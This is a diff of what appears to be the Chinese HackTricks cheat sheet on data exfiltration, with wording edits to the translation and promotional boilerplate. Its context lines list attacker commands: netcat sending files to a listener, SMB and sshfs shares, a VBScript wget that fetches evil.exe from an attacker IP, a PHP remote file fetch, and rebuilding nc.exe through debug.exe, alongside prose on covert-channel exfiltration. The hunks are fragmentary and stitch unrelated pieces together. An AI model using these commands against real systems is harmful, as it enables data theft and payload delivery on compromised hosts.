@@ -1,32 +1,32 @@
-# 数据泄露
+# 数据外泄
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## 常见的白名单域名用于信息泄露
+## 常见的白名单域用于信息外泄
 
-查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域名
+查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域
 
-## 复制并粘贴Base64
+## 复制\&粘贴Base64
 
 **Linux**
 ```bash
@@ -132,7 +132,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP服务器（pure-ftp）
+### FTP服务器 (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali作为服务器
+Kali 作为服务器
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -189,27 +189,27 @@ service smbd restart
 
 ### Exfiltration Over Command and Control Channel
 
-Exfiltration over the command and control (C2) channel is a common technique used by attackers to steal data from compromised systems. Attackers can use the existing C2 channel to exfiltrate data in a covert manner, making it difficult for defenders to detect the data exfiltration.
+During post-exploitation, an attacker may exfiltrate data over the command and control channel. This can be achieved by executing commands on the compromised system to gather and exfiltrate sensitive information to the attacker-controlled server.
 
 ### Exfiltration Over Alternative Protocols
 
-Attackers can also exfiltrate data using alternative protocols such as DNS, ICMP, or HTTPS. By using these alternative protocols, attackers can bypass network security controls that may not inspect traffic on these protocols.
+Attackers may use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data from a compromised system. By encoding the data within the protocol traffic, attackers can bypass network security controls and exfiltrate data without raising suspicion.
 
-### Exfiltration Over Unmonitored Ports
+### Exfiltration Over Unmonitored Protocols
 
-Attackers can exfiltrate data over ports that are typically not monitored by security devices. By using uncommon ports for exfiltration, attackers can evade detection by traditional security monitoring tools.
+Attackers may exfiltrate data over protocols that are typically not monitored by security devices, such as FTP or SMTP. By leveraging these unmonitored protocols, attackers can exfiltrate data without triggering alerts from security systems.
 
 ### Exfiltration Using Steganography
 
-Steganography is the technique of hiding data within other files to avoid detection. Attackers can use steganography to exfiltrate data by embedding it within image or audio files before exfiltrating them from the compromised system.
-
-### Exfiltration Using Data Encoding
-
-Attackers can encode the exfiltrated data to bypass security controls that may inspect data based on known signatures. By encoding the data, attackers can make it appear as benign traffic, making it harder for defenders to identify the exfiltration.
+Steganography involves hiding data within other non-secret files or messages to exfiltrate information without detection. Attackers can embed sensitive data within images, audio files, or other digital media to evade detection by security mechanisms.
 
 ### Exfiltration Using Encryption
 
-Encryption can be used to protect exfiltrated data from being intercepted by security devices. By encrypting the exfiltrated data, attackers can ensure that even if the data is intercepted, it cannot be easily read or understood by defenders.
+Attackers may encrypt exfiltrated data to prevent detection by security tools. By encrypting the data before exfiltration, attackers can ensure that even if the data is intercepted, it remains unintelligible to anyone without the decryption key.
+
+### Exfiltration Using Covert Channels
+
+Covert channels involve using unconventional communication methods to exfiltrate data. This can include techniques such as manipulating timing channels, storage channels, or network protocols to transfer data stealthily without being detected by traditional security measures.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -233,7 +233,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC（Netcat）是一个强大的网络工具，可用于在网络上读取和写入数据。它可以用于创建反向或正向shell、传输文件以及执行任意命令。NC通常用于渗透测试和网络攻击中。
+NC（Netcat）是一个强大的网络工具，可用于在网络上发送和接收数据。它可以用于创建反向shell、传输文件以及在渗透测试中进行数据传输。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -274,13 +274,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-在XP和2003中默认启用（在其他系统中需要在安装过程中显式添加）
+在XP和2003中默认情况下（在其他系统中需要在安装过程中显式添加）
 
 在Kali中，**启动TFTP服务器**：
 ```bash
@@ -306,7 +306,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic Script (VBScript) 是一种基于对象的脚本语言，通常用于 Windows 环境中。它可以用于执行各种系统管理任务和自动化操作。
+Visual Basic 脚本 (VBScript) 是一种基于 Visual Basic 的脚本语言，通常用于 Windows 环境中。它可以用于执行各种任务，包括文件操作、系统管理和数据处理。VBScript 可以通过多种方式进行数据泄露，包括通过网络传输数据、将数据写入文件或通过其他外部通道传输数据。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -344,7 +344,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，重要的是要注意`debug.exe`有一个**组装文件大小限制为64 kb**。
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，需要注意的是debug.exe有一个**组装文件大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -356,7 +356,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -364,12 +364,12 @@ wine exe2bat.exe nc.exe nc.txt
 
 <summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-其他支持HackTricks的方式：
+支持HackTricks的其他方式：
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
